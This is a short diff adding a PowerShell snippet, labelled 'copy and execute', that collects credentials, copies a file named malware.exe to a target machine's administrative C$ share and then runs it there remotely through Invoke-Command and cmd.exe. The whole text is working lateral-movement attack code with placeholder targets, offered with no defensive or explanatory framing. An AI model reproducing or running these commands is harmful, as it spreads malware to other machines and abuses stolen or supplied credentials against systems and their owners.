@@ -1,0 +1,7 @@
+
+--------copy and execute
+
+$cred = Get-Credential
+Copy-Item -Path "C:\malware.exe" -Destination "\\TARGET_IP\C$\temp\malware.exe" -Credential (Get-Credential)
+
+Invoke-Command -ComputerName iptarget -Credential $cred -ScriptBlock { Start-Process -Wait -FilePath "cmd.exe" -ArgumentList "/c C:\temp\malware.exe"};
